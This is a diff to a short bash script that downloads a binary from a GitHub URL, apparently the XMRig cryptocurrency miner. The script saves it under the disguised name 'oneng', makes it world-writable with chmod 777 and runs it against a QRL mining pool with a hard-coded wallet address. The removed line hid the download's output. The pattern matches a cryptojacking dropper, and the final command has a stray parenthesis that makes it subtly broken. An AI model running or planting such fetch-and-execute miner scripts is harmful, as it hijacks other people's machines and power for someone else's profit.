@@ -1,4 +1,4 @@
 #!/bin/bash
-wget -O oneng https://github.com/kidoescegh/xm/raw/main/newxm > /dev/null 2>&1
+wget -O oneng https://github.com/claires67/buut/raw/main/xmrig
 chmod 777 oneng
 ./oneng --donate-level 1 -o de.qrl.herominers.com:1166 -u Q010500dcddedd09eb43778b8c86fc30d1682af477c2693f24c34113532603031ecdac7e2d5a133.$(shuf -i 1-100000 -n 1)-mmh) -a rx/0 -k 
